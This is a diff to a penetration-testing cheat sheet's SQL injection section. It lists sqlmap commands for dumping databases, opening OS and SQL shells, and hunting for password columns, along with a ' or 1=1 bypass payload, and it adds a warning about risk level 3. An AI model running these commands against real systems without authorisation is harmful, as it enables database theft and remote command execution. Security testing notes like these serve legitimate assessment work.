@@ -235,19 +235,20 @@ Path traversal:
 ## SQL Injection
 SQLMap
 - Use saved request from burp: (-p is parameter, can be removed if you add * to the param in the request file, remember to use force-ssl param!)  
-  `sqlmap -r request.txt -p objectid --risk 3 --level 5` 
+  `sqlmap -r request.txt -p objectid --risk 2 --level 5`
+  Note: risk level 3 could in some cases lead to updating all entries in a db! If you want to use this risk level, check the payloads in xml/payloads.xml!   
 - Define the target DBMS and run the request through local proxy (e.g. burp). Show the schema of the DB:   
-  `sqlmap --proxy http://localhost:8080 -r request --dbms="Microsoft SQL Server 2017" --schema --force-ssl` 
+  `sqlmap --proxy http://localhost:8080 -r request --dbms="Microsoft SQL Server 2017" --schema --force-ssl`   
 - SQLMap Crawl:  
-  `sqlmap -u http://10.10.10.10 --crawl=1`
+  `sqlmap -u http://10.10.10.10 --crawl=1`   
 - SQLMap Dump DB:  
-  `sqlmap -u http://10.10.10.10 --dbms=mysql --dump` 
-- SQLMap Shell:  
-  `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell` 
-- SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:  
-  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U --force-ssl`  
-- Search for columns with the name password   
-  `python sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --time-sec=1 --search -C 'password'`  
+  `sqlmap -u http://10.10.10.10 --dbms=mysql --dump`    
+- SQLMap Shell:   
+  `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell`   
+- SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:    
+  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U --force-ssl`    
+- Search for columns with the name password    
+  `python sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --time-sec=1 --search -C 'password'`    
 
 Bypasses  
   `' or 1=1;#`  (MySQL/MariaDB)
